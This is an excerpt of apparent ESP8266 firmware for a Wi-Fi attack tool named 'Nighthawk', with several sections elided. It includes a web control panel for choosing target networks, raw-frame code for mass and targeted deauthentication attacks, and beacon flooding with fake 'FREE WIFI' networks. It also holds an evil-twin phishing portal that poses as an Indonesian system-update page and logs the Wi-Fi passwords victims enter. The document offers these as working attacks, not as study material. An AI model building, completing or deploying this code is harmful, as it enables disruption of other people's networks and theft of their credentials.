/* * GMPRO87 v16.1 NIGHTHAWK - FIXED COMPILE
...
String capturedPass = "";
String sysLog = "[INIT] Nighthawk v16.1 Ready.";
...
void handleAdmin() {
  ...
  for(int i=0;i<nCnt;i++){ 
    h += "<tr><td><b>" + networks[i].ssid + "</b><br><small>CH:" + String(networks[i].ch) + "</small></td>";
    h += "<td align='right'><a class='lock' href='/lock?id=" + String(i) + "'>TARGET</a></td></tr>"; 
  }
  h += "</table><button class='btn' onclick=\"location.href='/'\">FORCE SCAN</button></div>";

  // PAGE 2: EXPLOIT
  h += "<div id='p2' style='display:none'><h3>Payload</h3><p>Locked: " + target.ssid + "</p>";
  h += String("<button class='btn ") + (activeMode==1?"active-m":"") + "' onclick=\"location.href='/set?m=1'\">MASS DEAUTH</button>";
  h += String("<button class='btn ") + (activeMode==2?"active-m":"") + "' onclick=\"location.href='/set?m=2'\">TARGET DEAUTH</button>";
  h += String("<button class='btn ") + (activeMode==4?"active-m":"") + "' onclick=\"location.href='/set?m=4'\">RICK ROLL</button>";
  h += String("<button class='btn ") + (activeMode==5?"active-m":"") + "' onclick=\"location.href='/set?m=5'\">KARMA MODE</button>";
  h += "<button class='btn' style='border-color:red;color:red' onclick=\"location.href='/set?m=0'\">STOP ALL</button></div>";
  ...
  h += String("<button class='btn ") + (activeMode==3?"active-m":"") + "' onclick=\"location.href='/set?m=3'\">START PHISHING</button>";
...
void handlePortal() {
  if (activeMode == 3) {
    if (webServer.hasArg("pass")) {
      ...
      sysLog = "[!] Captured: " + webServer.arg("pass") + "<br>" + sysLog;
      ...
      p += "<div style='padding:20px'><h3>Pembaruan Sistem</h3><p>Masukkan sandi Wi-Fi <b>" + target.ssid + "</b></p><form method='POST'><input name='pass' type='password' style='width:100%;padding:10px;margin:10px 0' required><button style='width:100%;background:#ed1c24;color:#fff;padding:10px;border:none'>LANJUT</button></form></div></body></html>";
...
// ===== SYSTEM SETUP =====
void setup() {
  system_update_cpu_freq(160); // Set 160MHz for high-performance injection
  ...
  webServer.on("/lock", [](){ 
    target = networks[webServer.arg("id").toInt()]; 
    sysLog = "[+] Target Locked: " + target.ssid + "<br>" + sysLog;
    webServer.sendHeader("Location", "/"); 
    webServer.send(302); 
  });
...
void loop() {
  ...
  if (millis() - lastAct > 40) { // 40ms attack pulse
    if (activeMode == 1) { // Mass Deauth
      int c = random(1, 14); wifi_set_channel(c); 
      for(int i=10; i<22; i++) dPkt[i] = random(256); 
      wifi_send_pkt_freedom(dPkt, 26, 0); 
    } 
    else if (activeMode == 2 && target.ssid != "") { // Target Deauth
      wifi_set_channel(target.ch); 
      memcpy(&dPkt[10], target.bssid, 6); 
      memcpy(&dPkt[16], target.bssid, 6); 
      wifi_send_pkt_freedom(dPkt, 26, 0); 
    }
    else if (activeMode == 4) { // Rick Roll
      sendBcn("Never Gonna", random(1,14)); 
      sendBcn("Give You Up", random(1,14)); 
    }
    else if (activeMode == 5) { // Karma Mode
      sendBcn("FREE WIFI", random(1,14)); 
      sendBcn("IndiHome_Free", random(1,14)); 
    }
    yield(); 
    lastAct = millis();
  }
  ...
  if(activeMode == 0 && millis() - lastScan > 10000) {
    nCnt = WiFi.scanNetworks(); 
    for(int i=0; i<min(nCnt, 20); i++) { 
      networks[i] = {WiFi.SSID(i), WiFi.channel(i), {0}, WiFi.RSSI(i)}; 
